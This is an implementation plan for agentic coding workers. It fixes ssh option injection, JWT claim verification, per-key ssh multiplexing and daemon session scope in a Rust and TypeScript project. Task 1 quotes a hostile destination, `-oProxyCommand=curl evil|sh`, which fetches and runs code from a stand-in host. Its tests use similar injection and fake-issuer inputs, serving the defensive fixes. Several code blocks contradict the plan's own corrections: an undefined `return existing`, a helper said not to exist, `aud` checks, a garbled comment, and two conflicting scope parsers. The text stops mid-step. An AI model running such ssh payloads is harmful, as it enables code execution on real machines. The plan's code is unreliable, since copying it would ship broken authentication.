# Onboarding Prerequisites Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the four defects in shipped code that the device-onboarding design assumes are already fixed, so that a scope means something, an address cannot execute a command, a connection authenticates as the key it names, and a session token is verified against the claims it relies on.

**Architecture:** Four independent changes in three crates and one Worker. Nothing here adds a feature; each one closes a gap between what the product documents and what it does. They land in ascending order of risk: an argument-list fix, a token verifier, a connection-identity change, then the daemon scope path, which is the only one that touches the protocol.

**Tech Stack:** Rust 1.85+ (`crates/cli`, `crates/daemon`, `crates/transport`), TypeScript on Cloudflare Workers with vitest (`services/relay`), OpenSSH as the transport.

**Spec:** [`docs/superpowers/specs/2026-08-16-device-onboarding-design.md`](../specs/2026-08-16-device-onboarding-design.md) — "Blocking prerequisites".

## Global Constraints

- **US English throughout**, in code, comments and copy. Never "authorise", "colour", "centre".
- **Never run `cargo fmt`.** The Rust tree is hand-formatted and CI skips `fmt --check` deliberately. Match the surrounding style by hand.
- **`cargo` is at `~/.cargo/bin/cargo`** and may not be on `PATH`. Invoke it by absolute path if `cargo` is not found.
- **Comments explain why, not what.** This codebase's comments carry the reasoning and the history of a decision. Match that density; a change that reverses an earlier decision says so and says why.
- **A channel's names are its own.** `farcooler_protocol::CHANNEL` distinguishes stable, preview, canary and local. Anything named per channel today stays named per channel.
- **No new dependencies** without saying so explicitly. Every crate added is a decision, not an implementation detail.
- **Tests are named as sentences**, matching the existing files: `the_daemon_serves_the_protocol_over_stdio`, not `test_stdio`.

---

### Task 1: `ssh_args` terminates its options

`crates/cli/src/remote.rs:62` builds the argument list with `target` as the last element and no `--` separator. A target beginning with `-o` is parsed by ssh as an option, so `-oProxyCommand=curl evil|sh` is local command execution. This is unreachable today because every target is typed by a human, and the onboarding design makes targets arrive in a scanned manifest — which is exactly the transition that turns a latent hazard into a vulnerability.

**Files:**
- Modify: `crates/cli/src/remote.rs` — `ssh_args` (around line 62) and its tests (around line 389)

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `fn ssh_args(target: &str) -> Vec<String>` — unchanged signature, now emitting `--` immediately before the target. Task 3 changes this signature; it must preserve the `--` placement.

- [ ] **Step 1: Write the failing tests**

Add to the existing `mod tests` in `crates/cli/src/remote.rs`:

```rust
    /// `--` before the destination, or an address is an option.
    ///
    /// ssh parses anything beginning with `-` as a flag wherever it appears, so
    /// a destination of `-oProxyCommand=...` runs a local command. Nothing
    /// types that today; a scanned manifest could carry it.
    #[test]
    fn the_destination_cannot_be_read_as_an_option() {
        let args = ssh_args("-oProxyCommand=touch /tmp/pwned");
        let end = args.iter().position(|a| a == "--").expect("no -- before the destination");
        let target = args.iter().position(|a| a.starts_with("-oProxyCommand")).expect("no target");
        assert!(end < target, "-- must come before the destination: {args:?}");
        assert_eq!(target, args.len() - 1, "the destination is last: {args:?}");
    }

    /// The ordinary case is unchanged apart from the separator.
    #[test]
    fn an_ordinary_destination_is_still_last() {
        let args = ssh_args("you@box");
        assert_eq!(args.last().map(String::as_str), Some("you@box"));
        assert_eq!(args[args.len() - 2], "--");
    }
```

- [ ] **Step 2: Run them to verify they fail**

```bash
~/.cargo/bin/cargo test -p farcooler-cli the_destination_cannot_be_read_as_an_option -- --nocapture
```

Expected: FAIL with `no -- before the destination`.

- [ ] **Step 3: Add the separator**

In `crates/cli/src/remote.rs`, change the tail of `ssh_args`:

```rust
        "-o".into(),
        "ConnectTimeout=10".into(),
        // Everything after this is a destination, never a flag.
        //
        // ssh reads a leading `-` as an option wherever it appears, so a
        // destination of `-oProxyCommand=...` is local command execution. No
        // human types that, but a destination that arrives in a scanned
        // manifest is not typed by a human — see the onboarding design.
        "--".into(),
        target.to_string(),
    ]
```

- [ ] **Step 4: Run the tests to verify they pass**

```bash
~/.cargo/bin/cargo test -p farcooler-cli --lib remote::
```

Expected: PASS, including the pre-existing `ssh_args` assertions.

- [ ] **Step 5: Check no caller depended on the old shape**

```bash
grep -rn "ssh_args" crates/ | grep -v target
```

Expected: `connect()` in the same file, which appends the remote command *after* the target and is unaffected, plus the tests. If any caller indexes into the vector by position, fix it now.

- [ ] **Step 6: Commit**

```bash
git add crates/cli/src/remote.rs
git commit -m "fix(cli): a destination is a destination, never an option

ssh parses a leading dash as a flag wherever it appears, so a destination
of -oProxyCommand=... runs a local command. Every destination is typed by
a human today, which is why this has never mattered; the onboarding
design has them arrive in a scanned manifest, which is the transition
that turns it into a vulnerability."
```

---

### Task 2: The relay verifies the claims it relies on

`services/relay/src/workos.ts:23` verifies a signature and an *optional* expiry. It does not require `exp`, and checks neither the issuer, the client binding, `iat` nor `nbf` — so a token minted for another application in a reused WorkOS environment is accepted as a user session under its `sub`.

**Files:**
- Modify: `services/relay/src/workos.ts`
- Modify: `services/relay/test/relay.test.ts`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `verifySession` keeps its existing return shape and **gains** a field. It already returns an object, not a bare `sub` — `services/relay/src/index.ts:751` reads `session.userId` and `session.email`, and dropping either breaks the account upsert. `Session` keeps its existing shape unchanged; this task tightens the checks around it and adds no field. Read the real type in `workos.ts` before editing; do not retype it from this plan.

**Corrections to what this task originally said**, all found before the code
shipped.

There is no `verifySignature()` helper to call — signature verification is inline
in `verifySession` at `workos.ts:35-46`, and the claim checks go after it.

**Check the claims that exist.** A WorkOS access token carries
`iss, sub, client_id, act, org_id, role, roles, permissions, entitlements,
feature_flags, sid, jti, exp, iat`. Three consequences, each of which would
otherwise refuse every real token:

- **No `aud`.** The client binding is the `client_id` claim, so check
  `claims.client_id === env.WORKOS_CLIENT_ID`. That is the same goal — a token
  minted for another application in a shared environment is refused — using the
  claim that is actually there.
- **No `auth_time`.** Do not require it and do not carry it. The
  fresh-authentication idea it was for is gone; `LocalAuthentication` at the
  moment of the tap is the freshness, and it lives on the device. `iat` cannot
  substitute: `/v1/auth/refresh` mints fresh access tokens from refresh tokens,
  so a recent `iat` proves a refresh, not a person.
- **`iss` is the bare `https://api.workos.com`**, not a per-client URL. A custom
  AuthKit domain makes it `https://auth.<domain>`. This exact mismatch has its
  own WorkOS issue (workos/authkit-tanstack-start#45); confirm against a real
  token per deployment before shipping.

- [ ] **Step 1: Read the current verifier and its callers**

```bash
cat services/relay/src/workos.ts
grep -n "verifySession\|requireAccount" services/relay/src/index.ts
```

Note the exact return type and every call site before changing it.

- [ ] **Step 2: Write the failing tests**

Add to `services/relay/test/relay.test.ts`. Use the file's existing helper for minting a signed test JWT; if there is none, add one that signs with a local JWK and register that JWK as the environment's key set.

```ts
describe('session verification', () => {
  it('refuses a token with no expiry', async () => {
    const token = await signTestJwt({ sub: 'user_1', iss: ISS, aud: CLIENT_ID })
    expect(await verifySession(token, env)).toBeNull()
  })

  it('refuses a token from another issuer', async () => {
    const token = await signTestJwt({ sub: 'user_1', iss: 'https://evil.example', aud: CLIENT_ID, exp: soon() })
    expect(await verifySession(token, env)).toBeNull()
  })

  it('refuses a token minted for another application', async () => {
    const token = await signTestJwt({ sub: 'user_1', iss: ISS, aud: 'client_other', exp: soon() })
    expect(await verifySession(token, env)).toBeNull()
  })

  it('refuses a token that is not yet valid', async () => {
    const token = await signTestJwt({ sub: 'user_1', iss: ISS, aud: CLIENT_ID, exp: soon(), nbf: soon() })
    expect(await verifySession(token, env)).toBeNull()
  })

  it('accepts a token shaped like a real one', async () => {
    const token = await signTestJwt({
      sub: 'user_1', iss: ISS, client_id: CLIENT_ID, exp: soon(), iat: now(),
    })
    expect((await verifySession(token, env))?.userId).toBe('user_1')
  })
})
```

- [ ] **Step 3: Run them to verify they fail**

```bash
cd services/relay && npx vitest run test/relay.test.ts -t 'session verification'
```

Expected: FAIL — the no-expiry and wrong-audience cases return a session today.

- [ ] **Step 4: Tighten the verifier**

Rewrite the claim checks in `services/relay/src/workos.ts`. Required, in this order, refusing on any failure:

```ts
/// Every claim this relay's authorization depends on, checked.
///
/// It used to verify the signature and an OPTIONAL expiry, which is two
/// holes wearing one coat. A token with no `exp` never expired, and a
/// token minted for a different application in the same WorkOS
/// environment carried a valid signature — so it authenticated as its
/// `sub` here, against an account it had nothing to do with.
///
/// No `auth_time` is read, because a WorkOS access token does not carry one.
/// step in the onboarding design demands a *fresh* authentication, and
/// this is the only claim that can answer when the person last proved
/// who they were.
export interface Session {
  sub: string
}

const LEEWAY_SECONDS = 60

export async function verifySession(token: string, env: Env): Promise<Session | null> {
  const claims = await verifySignature(token, env)   // existing JWKS path, unchanged
  if (!claims) return null

  const now = Math.floor(Date.now() / 1000)

  if (typeof claims.exp !== 'number' || claims.exp + LEEWAY_SECONDS < now) return null
  if (typeof claims.iat !== 'number' || claims.iat - LEEWAY_SECONDS > now) return null
  if (typeof claims.nbf === 'number' && claims.nbf - LEEWAY_SECONDS > now) return null
  if (claims.iss !== env.WORKOS_ISSUER) return null
  if (!audienceMatches(claims.aud, env.WORKOS_CLIENT_ID)) return null
  if (typeof claims.sub !== 'string' || claims.sub.length === 0) return null

  return existing
}

/// `aud` is a string or an array of them, per RFC 7519.
function audienceMatches(aud: unknown, clientId: string): boolean {
  if (typeof aud === 'string') return aud === clientId
  if (Array.isArray(aud)) return aud.includes(clientId)
  return false
}
```

Add `WORKOS_ISSUER` to the `Env` interface in `services/relay/src/index.ts` and to every environment block in `services/relay/wrangler.toml`. Its value is the issuer WorkOS puts in this environment's tokens — read it from a real token rather than guessing, and record where you read it from in the commit message.

- [ ] **Step 5: Update the callers**

`requireAccount` and anything else calling `verifySession` now receives an object rather than a string. Change the call sites so `account` remains the `sub`:

```bash
grep -n "verifySession" services/relay/src/index.ts
```

- [ ] **Step 6: Run the full relay suite**

```bash
cd services/relay && npx vitest run
```

Expected: PASS. Existing tests that mint tokens without `exp`, `iss` or `aud` will fail until their fixtures carry the claims a real token carries — fix the fixtures, not the verifier.

- [ ] **Step 7: Commit**

```bash
git add services/relay/src/workos.ts services/relay/src/index.ts services/relay/test/relay.test.ts services/relay/wrangler.toml
git commit -m "fix(relay): verify the claims the authorization depends on

A signature and an optional expiry is two holes wearing one coat. A
token with no exp never expired, and a token minted for a different
application in the same WorkOS environment carried a valid signature,
so it authenticated here as its sub against an account it had nothing
to do with. Issuer, audience, expiry, iat and nbf are now required.

There is no auth_time claim to keep: a WorkOS access token does not
carry one, so requiring it would have refused every real token. The
confirmation's freshness is LocalAuthentication on the device instead."
```

---

### Task 3: A connection authenticates as the key it names

The onboarding design has Far Cooler connect as a specific key — Key A, the restricted one carrying the forced command that gives the daemon an identity it can trust. Two things in `crates/cli/src/remote.rs` prevent that today:

- `ssh_args` passes no `-i` at all, so ssh offers whatever the agent and config volunteer.
- `ControlPath=~/.ssh/farcooler-%r@%h:%p` keys the multiplexed master on **user, host and port — not on the key**. A master already authenticated with another key services the next invocation, `-i` is never consulted, and `ControlPersist=120` keeps that master alive for two minutes *after* the key is revoked.

This task makes the connection able to name its key and gives each key its own master. Where the key comes from is the onboarding plan's problem; this one makes it possible to pass one.

**Files:**
- Modify: `crates/cli/src/remote.rs` — `ssh_args`, `connect`, tests
- Modify: every caller of `connect` (find them in step 1)

**Interfaces:**
- Consumes: Task 1's `--` placement, which must survive.
- Produces:
  - `fn ssh_args(target: &str, identity: Option<&Path>) -> Vec<String>` — with `Some(path)`, emits `-i <path>`, `-o IdentitiesOnly=yes`, and a `ControlPath` unique to that identity and channel.
  - `fn control_path(identity: Option<&Path>) -> String` — the `ControlPath` value, exposed for testing.
  - `pub async fn connect(target: &str, identity: Option<&Path>) -> Result<RemoteLink, Box<dyn std::error::Error>>`.
  - Task 5 does not use these. The onboarding plan passes `Some(key_a_path)`.

- [ ] **Step 1: Find every caller**

```bash
grep -rn "remote::connect\|connect(" crates/cli/src/ | grep -v target | grep -v "fn connect"
```

Write the list down. Every one becomes `connect(target, None)` in this task, preserving today's behavior exactly.

- [ ] **Step 2: Write the failing tests**

```rust
    /// A named identity is the only identity offered.
    ///
    /// Without `IdentitiesOnly`, an agent holding a dozen keys offers them
    /// all and can exhaust MaxAuthTries before reaching this one.
    #[test]
    fn a_named_identity_is_the_only_one_offered() {
        let key = std::path::Path::new("/tmp/farcooler-key");
        let args = ssh_args("you@box", Some(key));
        let has_pair =
            |pair: [&str; 2]| args.windows(2).any(|w| w[0] == pair[0] && w[1] == pair[1]);
        assert!(has_pair(["-i", "/tmp/farcooler-key"]), "no -i: {args:?}");
        assert!(has_pair(["-o", "IdentitiesOnly=yes"]), "no IdentitiesOnly: {args:?}");
    }

    /// Two identities to one destination are two masters.
    ///
    /// ControlPath used to be keyed on user, host and port alone, so a master
    /// authenticated with one key silently served a connection asking for
    /// another — and outlived that key's revocation by ControlPersist.
    #[test]
    fn each_identity_gets_its_own_master() {
        let a = control_path(Some(std::path::Path::new("/tmp/key-a")));
        let b = control_path(Some(std::path::Path::new("/tmp/key-b")));
        let none = control_path(None);
        assert_ne!(a, b, "two keys shared one control socket");
        assert_ne!(a, none, "a named key shared the default control socket");
    }

    /// A channel's socket is its own, like everything else it owns.
    #[test]
    fn a_control_path_carries_the_channel() {
        let path = control_path(None);
        assert!(
            path.contains(farcooler_protocol::CHANNEL.name()),
            "no channel in {path}"
        );
    }

    /// Task 1's separator survives the new argument.
    #[test]
    fn the_destination_is_still_last_with_an_identity() {
        let args = ssh_args("you@box", Some(std::path::Path::new("/tmp/k")));
        assert_eq!(args.last().map(String::as_str), Some("you@box"));
        assert_eq!(args[args.len() - 2], "--");
    }
```

If `farcooler_protocol::CHANNEL` has no `name()`, use whatever the crate already exposes for the channel's string — check `crates/protocol/src/lib.rs` and match it rather than adding a method.

- [ ] **Step 3: Run them to verify they fail**

```bash
~/.cargo/bin/cargo test -p farcooler-cli --lib remote::
```

Expected: FAIL to compile — `ssh_args` takes one argument and `control_path` does not exist.

- [ ] **Step 4: Implement**

```rust
/// Where this identity's multiplexed master lives.
///
/// Keyed on the identity as well as the destination, which the old
/// `farcooler-%r@%h:%p` was not. That path let a master authenticated with one
/// key serve a connection that asked for another: `-i` is consulted only when
/// ssh actually authenticates, and a live master does not. It also outlived
/// revocation, because sshd reads authorized_keys at authentication and a
/// surviving master never authenticates again — for ControlPersist seconds
/// after the key was removed.
///
/// **Key A does not multiplex at all.** Review found that hashing the key PATH
/// does not identify the KEY — replacing a key at the same account-scoped path
/// reuses the old authenticated master. And `ControlPersist=120` means a master
/// keeps opening channels for two minutes after revocation, which a server
/// cannot end: `ssh -O exit` targets a client-owned socket the runner cannot
/// reach. A prerequisite that promises prompt revocation and delivers a
/// two-minute window is worse than one that does not promise it.
///
/// So: when an identity is named, pass `ControlMaster=no` and no `ControlPath`.
/// The cost is a handshake per connection on the Key A path; the alternative is
/// a revocation story that is not true.
///
/// The identity is hashed rather than embedded: a socket path has a hard length
/// limit on macOS and a key path does not.
fn control_path(identity: Option<&Path>) -> String {
    let channel = farcooler_protocol::CHANNEL.name();
    match identity {
        None => format!("~/.ssh/farcooler-{channel}-default-%r@%h:%p"),
        Some(path) => {
            let digest = short_digest(path.to_string_lossy().as_bytes());
            format!("~/.ssh/farcooler-{channel}-{digest}-%r@%h:%p")
        }
    }
}

/// Eight hex characters of SHA-256. Enough to separate the handful of keys one
/// person holds, short enough to keep the socket path under the limit.
fn short_digest(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let out = Sha256::digest(bytes);
    out.iter().take(4).map(|b| format!("{b:02x}")).collect()
}
```

`sha2` is already in the workspace lockfile as a transitive dependency; add it to `crates/cli/Cargo.toml` as `sha2.workspace = true` and to `[workspace.dependencies]` if it is not there. If adding it to the workspace is not already done, say so in the commit message — a new direct dependency is a decision.

Then thread the identity through `ssh_args` and `connect`:

```rust
fn ssh_args(target: &str, identity: Option<&Path>) -> Vec<String> {
    let mut args = vec![
        "-o".into(),
        "BatchMode=yes".into(),
        "-o".into(),
        "ControlMaster=auto".into(),
        "-o".into(),
        format!("ControlPath={}", control_path(identity)),
        "-o".into(),
        "ControlPersist=120".into(),
        "-o".into(),
        "ServerAliveInterval=15".into(),
        "-o".into(),
        "ServerAliveCountMax=3".into(),
        "-o".into(),
        "ConnectTimeout=10".into(),
    ];
    if let Some(path) = identity {
        args.push("-i".into());
        args.push(path.to_string_lossy().into_owned());
        // Bound to the key we named. Without this an agent holding a dozen
        // keys offers them all and can exhaust MaxAuthTries first.
        args.push("-o".into());
        args.push("IdentitiesOnly=yes".into());
    }
    // Everything after this is a destination, never a flag. See Task 1.
    args.push("--".into());
    args.push(target.to_string());
    args
}
```

- [ ] **Step 5: Update every caller to `connect(target, None)`**

Use the list from step 1. `None` preserves today's behavior exactly: no `-i`, and a default control path that now carries the channel.

- [ ] **Step 6: Run the tests**

```bash
~/.cargo/bin/cargo test -p farcooler-cli
~/.cargo/bin/cargo build --workspace
```

Expected: PASS and a clean build.

- [ ] **Step 7: Verify against a real host if one is reachable**

```bash
./target/debug/farcooler --host you@box status
ls ~/.ssh/farcooler-*
```

Expected: `status` answers, and the control socket's name carries the channel. Skip if no host is reachable and say so in the commit message.

- [ ] **Step 8: Commit**

```bash
git add crates/cli/src/remote.rs crates/cli/Cargo.toml Cargo.toml
git commit -m "fix(cli): a connection can name its key, and each key gets its own master

ControlPath was keyed on user, host and port alone, so a master
authenticated with one key silently served a connection asking for
another -- ssh consults -i only when it actually authenticates, and a
live master does not. The same path outlived revocation: sshd reads
authorized_keys at authentication, and a surviving master never
authenticates again, so a revoked key kept working for ControlPersist
seconds.

The identity is optional and every caller passes None, so nothing
changes yet. The onboarding design needs to pass one."
```

---

### Task 4: A stdio session honors the scope it was given

`crates/daemon/src/main.rs:329` hands `Scope::HostAdmin` to every `--stdio` session. The scope table in `crates/daemon/src/rpc.rs:62` is real and enforced per method, so the only thing missing is that nothing ever gives a session anything less than host admin. Until that changes, a `read` device in the onboarding design would receive full host administration and the word would be decorative.

This task handles the **direct-serve** path only — the branch taken when no daemon is already listening. Task 5 handles the relay branch.

**Files:**
- Modify: `crates/daemon/src/main.rs` — argument parsing near line 58, `serve_stdio_session` near line 293
- Modify: `crates/daemon/tests/stdio_transport.rs`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces:
  - `fn requested_scope() -> Scope` — reads `--scope <read|control|host_admin>` from `std::env::args()`, defaulting to `Scope::HostAdmin`.
  - `fn requested_client() -> Option<String>` — reads `--client <id>`.
  - Task 5 uses both.

- [ ] **Step 1: Write the failing tests**

In `crates/daemon/tests/stdio_transport.rs`, generalize `spawn` to take extra arguments and add the cases:

```rust
/// Spawn the daemon in stdio mode with extra arguments.
async fn spawn_with(
    dir: &std::path::Path,
    extra: &[&str],
) -> (DaemonChild, Client<ChildStdout, ChildStdin>) {
    let mut command = Command::new(env!("CARGO_BIN_EXE_farcoolerd"));
    command.arg("--stdio");
    for arg in extra {
        command.arg(arg);
    }
    // ... the rest of `spawn`'s body, unchanged ...
}

/// A forced command's scope is the session's scope.
///
/// sshd runs the command in the authorized_keys entry and ignores whatever the
/// client asked for, so `--scope` is the one thing in this process's arguments
/// that the connecting device cannot choose. It used to be ignored entirely,
/// and every stdio session got host_admin.
#[tokio::test]
async fn a_scope_in_the_arguments_is_the_scope_of_the_session() {
    let dir = tempfile::tempdir().unwrap();
    let (_child, client) = spawn_with(dir.path(), &["--scope", "read"]).await;
    assert_eq!(client.server_hello().granted_scope, Scope::Read as i32);
}

/// A read session cannot reach a control method.
#[tokio::test]
async fn a_read_session_is_refused_a_control_method() {
    let dir = tempfile::tempdir().unwrap();
    let (_child, mut client) = spawn_with(dir.path(), &["--scope", "read"]).await;
    let err = client
        .call(request("repository.list"))
        .await
        .expect("repository.list is a read method and must answer");
    let _ = err;

    let refused = client.call(request("daemon.shutdown")).await;
    match refused {
        Err(ClientError::Refused(code)) => assert_eq!(code, ErrorCode::Forbidden as i32),
        other => panic!("a read session reached host_admin: {other:?}"),
    }
}

/// No scope means host_admin, and that is honest rather than lax.
///
/// A key with no forced command lets the connecting device write the whole
/// command line, so it could pass any --scope it liked. Defaulting to less
/// would protect nothing and would break every entry enrolled before this
/// existed.
#[tokio::test]
async fn no_scope_argument_still_means_host_admin() {
    let dir = tempfile::tempdir().unwrap();
    let (_child, client) = spawn(dir.path()).await;
    assert_eq!(client.server_hello().granted_scope, Scope::HostAdmin as i32);
}
```

Adjust `ClientError::Refused` and `ErrorCode::Forbidden` to whatever the transport crate actually names them — check `crates/transport/src/lib.rs` and `crates/protocol` and use the real variants rather than these.

- [ ] **Step 2: Run them to verify they fail**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon --test stdio_transport
```

Expected: FAIL — `a_scope_in_the_arguments_is_the_scope_of_the_session` reports `HostAdmin`.

- [ ] **Step 3: Parse the arguments**

Near the existing `--stdio` check in `crates/daemon/src/main.rs`:

```rust
/// The scope this session was started at, from the forced command.
///
/// `authorized_keys` carries `command="... --scope read"`, and sshd runs that
/// instead of whatever the client asked for — so this is the one thing on the
/// command line the connecting device cannot choose. That is the whole
/// mechanism: identity and scope are asserted by the file on this machine, not
/// by the connection.
///
/// Absent means host_admin, which is honest rather than lax. A key with no
/// forced command lets the device write the entire command line, so it could
/// pass any scope it liked; defaulting to less would protect nothing and would
/// break every entry enrolled before this existed.
fn requested_scope() -> Scope {
    let args: Vec<String> = std::env::args().collect();
    let Some(i) = args.iter().position(|a| a == "--scope") else {
        return Scope::HostAdmin;
    };
    match args.get(i + 1).map(String::as_str) {
        Some("read") => Scope::Read,
        Some("control") => Scope::Control,
        // An unrecognized scope is host_admin for the same reason absence is:
        // it can only have come from this machine's own authorized_keys.
        _ => Scope::HostAdmin,
    }
}

/// Which enrolled device this is, as the file says rather than as it claims.
fn requested_client() -> Option<String> {
    let args: Vec<String> = std::env::args().collect();
    let i = args.iter().position(|a| a == "--client")?;
    args.get(i + 1).cloned()
}
```

Then at `main.rs:329`, replace the constant:

```rust
    let cfg = HandshakeConfig {
        daemon_version: farcooler_protocol::BUILD.to_string(),
        granted_scope: requested_scope(),
    };
```

Leave `main.rs:199` — the Unix socket path — as `Scope::HostAdmin`. Its comment already explains why, and it stays true.

- [ ] **Step 3b: The handshake is not the enforcement — fix `RpcFactory`**

**Without this the rest of the task is decorative, and its own test fails.**
`crates/daemon/src/main.rs:366-368` builds a fresh `Rpc` per request with a
literal:

```rust
let rpc =
    Rpc::new(self.service.clone(), self.watcher.clone(), Scope::HostAdmin, self.stop.clone());
```

`HandshakeConfig.granted_scope` only changes what `ServerHello` *reports*. The
scope table in `rpc.rs:62` is real and enforced, but nothing ever hands it
anything below host admin. So a `read` session would be told it has `read` and
then be permitted everything.

`RpcFactory` must carry the connection's scope and pass it to `Rpc::new`. For
this task that can be a field on `RpcFactory` set once per process, since a
`--stdio` process serves exactly one session:

```rust
struct RpcFactory {
    service: Arc<Service>,
    watcher: Arc<Watcher>,
    stop: Arc<tokio::sync::Notify>,
    /// What this session may do. One process, one session, one scope.
    ///
    /// It used to be a `Scope::HostAdmin` literal inside `handle`, which meant
    /// the handshake advertised a scope the handler never applied.
    granted: Scope,
}
```

**The client id is a separate, larger change and is NOT in this task.** Carrying
a per-connection principal (`{client_id, scope}`) through the `Handler` trait is
what writer leases, per-client idempotency, auditing and revoke-by-client need —
see the open decision at the end of this plan, and `TODOS.md:48`.

- [ ] **Step 3c: A malformed scope refuses; only an absent one defaults**

An absent `--scope` means host_admin for backward compatibility, and that is
defensible: a key with no forced command lets the device write the whole command
line anyway. An **unrecognized** value is different — it is a typo in someone's
`authorized_keys`, and silently promoting it to host admin turns a
configuration mistake into privilege escalation.

```rust
    match args.get(i + 1).map(String::as_str) {
        Some("read") => Scope::Read,
        Some("control") => Scope::Control,
        Some("host_admin") => Scope::HostAdmin,
        // A present but unrecognized scope is a typo, not a policy. Refuse the
        // session rather than guessing upward.
        other => {
            eprintln!("unknown scope {:?}", other.unwrap_or("<missing>"));
            std::process::exit(1);
        }
    }
```

- [ ] **Step 4: Run the tests**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon --test stdio_transport
```

Expected: PASS.

- [ ] **Step 5: Run the whole daemon suite, to catch anything assuming host admin**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon
```

Expected: PASS. `crates/daemon/tests/rpc_over_socket.rs` already parameterizes scope and should be unaffected.

- [ ] **Step 6: Commit**

```bash
git add crates/daemon/src/main.rs crates/daemon/tests/stdio_transport.rs
git commit -m "feat(daemon): a stdio session honors the scope it was given

Every --stdio session got host_admin, so the scope table in rpc.rs --
which is real and enforced per method -- had nothing below host admin to
enforce. A read device would have received full host administration and
the word would have been decorative.

The scope comes from the forced command, which sshd runs instead of
whatever the client asked for, so it is the one thing on the command
line the connecting device cannot choose. Absent means host_admin, which
is honest: a key with no forced command lets the device write the whole
command line anyway.

The relay branch -- a stdio process piping into an already-running
daemon -- still inherits host_admin. That is the next commit."
```

---

### Task 5: The relayed branch carries its scope too

`serve_stdio_session` takes one of two branches. Task 4 fixed the second. The first, at `crates/daemon/src/main.rs:314`, connects to the already-running daemon's Unix socket and pipes bytes — and that daemon answers with the socket path's `Scope::HostAdmin`. So on any machine where a daemon is already listening, which is every machine in normal use, Task 4's scope is discarded.

`relay_stdio` is deliberately a dumb pipe and must stay one. So the scope travels as a preamble on the socket, read by the socket server before the protocol handshake begins.

**Files:**
- Modify: `crates/daemon/src/main.rs` — `relay_stdio`, `serve_stdio_session`, the socket server setup near line 189
- Modify: `crates/transport/src/connection.rs` if the socket server's handshake construction lives there — check first
- Modify: `apps/macos/Sources/FarCooler/DaemonClient.swift` and `crates/cli/src/daemon_link.rs` — every other socket client must send the preamble
- Create: `crates/daemon/tests/a_relayed_session_keeps_its_scope.rs`

**Interfaces:**
- Consumes: Task 4's `requested_scope()` and `requested_client()`.
- Produces: a one-line preamble on the Unix socket, `farcooler-session <scope> <client-or-dash>\n`, sent **only by the stdio relay**. The socket server reads it if present and treats its absence as `host_admin`.

**Two corrections from review.** The preamble is **optional**, not required:
absence means `host_admin`, which is today's behavior and is already justified
at `main.rs:199` — reaching this socket requires being the owning user, who
holds host admin regardless. Requiring it would break every already-installed
CLI on upgrade, and would do so *in front of* the version negotiation built to
explain version mismatches, so the user would see a hang-up rather than a
reason.

And only the stdio relay needs to send it. `DaemonClient.swift` is not a socket
client — it runs the CLI as a subprocess (`CLI.swift:59-67`). Editing "every
socket client" was blast radius for nothing.

- [ ] **Step 1: Find every Unix socket client**

```bash
grep -rn "socket_path\|UnixStream::connect" crates/ apps/macos/Sources/ | grep -v target
```

Every one of them sends the preamble after this task. Write the list down; a missed client is a client that cannot connect.

- [ ] **Step 2: Write the failing test**

Create `crates/daemon/tests/a_relayed_session_keeps_its_scope.rs`:

```rust
//! A stdio session relayed into a running daemon keeps the scope it was given.
//!
//! `serve_stdio_session` pipes into the already-running daemon rather than
//! opening a second service, because an agent's transcript lives in the first
//! daemon's memory. That pipe used to discard the scope: the running daemon
//! answers the handshake, and its socket path grants host_admin to a local
//! caller. So a read-enrolled device got host admin on every machine where a
//! daemon was already up, which is every machine in normal use.

use farcooler_protocol::v1::Scope;

#[tokio::test]
async fn a_relayed_stdio_session_is_not_promoted_to_host_admin() {
    let dir = tempfile::tempdir().unwrap();

    // A daemon listening on the socket, so the relay branch is the one taken.
    let _listening = spawn_listening_daemon(dir.path()).await;

    let (_child, client) = spawn_stdio_with(dir.path(), &["--scope", "read"]).await;
    assert_eq!(
        client.server_hello().granted_scope,
        Scope::Read as i32,
        "the relay branch discarded the scope"
    );
}
```

Reuse `DaemonChild` and the spawn helpers from `crates/daemon/tests/stdio_transport.rs` — move them into a shared `mod common` under `crates/daemon/tests/` rather than copying, and update `stdio_transport.rs` to use it.

- [ ] **Step 3: Run it to verify it fails**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon --test a_relayed_session_keeps_its_scope
```

Expected: FAIL, reporting `HostAdmin`.

- [ ] **Step 4: Send the preamble from the relay branch**

In `serve_stdio_session`, before calling `relay_stdio`:

```rust
    if let Ok(socket) = paths::socket_path() {
        if let Ok(mut stream) = tokio::net::UnixStream::connect(&socket).await {
            // Say who this is before any frame.
            //
            // The pipe below is deliberately dumb and must stay that way, so
            // the scope cannot ride inside the protocol -- this process would
            // have to parse it, which is a third opinion about a conversation
            // two other parties already agree on. One line before the
            // conversation starts is the whole mechanism.
            //
            // Anything that can reach this socket is already the owning user,
            // who holds host_admin regardless, so a client that lies here gains
            // nothing it did not already have.
            let scope = match requested_scope() {
                Scope::Read => "read",
                Scope::Control => "control",
                _ => "host_admin",
            };
            let client = requested_client().unwrap_or_else(|| "-".into());
            let preamble = format!("farcooler-session {scope} {client}\n");
            use tokio::io::AsyncWriteExt;
            if stream.write_all(preamble.as_bytes()).await.is_err() {
                eprintln!("cannot reach the running daemon");
                return Err(1);
            }
            return relay_stdio(stream).await;
        }
    }
```

- [ ] **Step 5: Read the preamble in the socket server, permissively**

Where the socket server accepts a connection and builds `HandshakeConfig` (near `main.rs:189`), peek for one line. If it is a well-formed preamble, use it. If it is absent, or the first bytes are a protocol frame rather than a preamble, fall back to `host_admin` and hand those bytes to the protocol unread — do not consume them.

A malformed preamble that *is* a preamble (right prefix, wrong scope word) refuses, for the same reason a malformed `--scope` refuses in Task 4: that is a mistake, not a policy.

Check whether the accept loop is in `crates/daemon/src/main.rs` or inside `UnixListenerServer`; if the latter, the per-connection config becomes a closure rather than a constant, and that is the change to make. This is also where `RpcFactory`'s `granted` field gets set per connection.

- [ ] **Step 6: No other client changes**

Nothing else sends a preamble. Absence already means what those clients hold today, so `DaemonClient.swift` and `daemon_link.rs` are untouched.

- [ ] **Step 7: Run everything**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon
